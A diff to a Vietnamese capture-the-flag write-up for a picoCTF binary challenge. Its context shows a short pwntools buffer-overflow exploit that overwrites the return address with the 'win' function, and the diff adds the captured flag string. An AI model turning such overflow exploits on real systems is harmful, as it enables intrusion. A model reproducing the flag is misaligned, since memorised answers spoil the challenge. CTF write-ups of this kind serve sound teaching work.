@@ -8,6 +8,7 @@ elf = ELF("./vuln")
 payload = b"a"*14 + p32(elf.symbols['win']) + p32(elf.symbols['UnderConstruction'])
 r.sendlineafter("Give me a string that gets you the flag\n", payload)
 r.interactive()
+# picoCTF{Cle4N_uP_M3m0rY_8d5089b9}
 ```
 chạy netcat ta nhận được
 ```
@@ -17,3 +18,5 @@ Names of user: 0x50755f4e 0x34656c43 0x7b465443
 Age of user: 0x6f636970
 ```
 do ở đây ta dùng tool để swap
+![image](https://user-images.githubusercontent.com/111769169/224530440-17144a8b-2564-4c2e-9e7e-8f95dca34c8b.png)
+
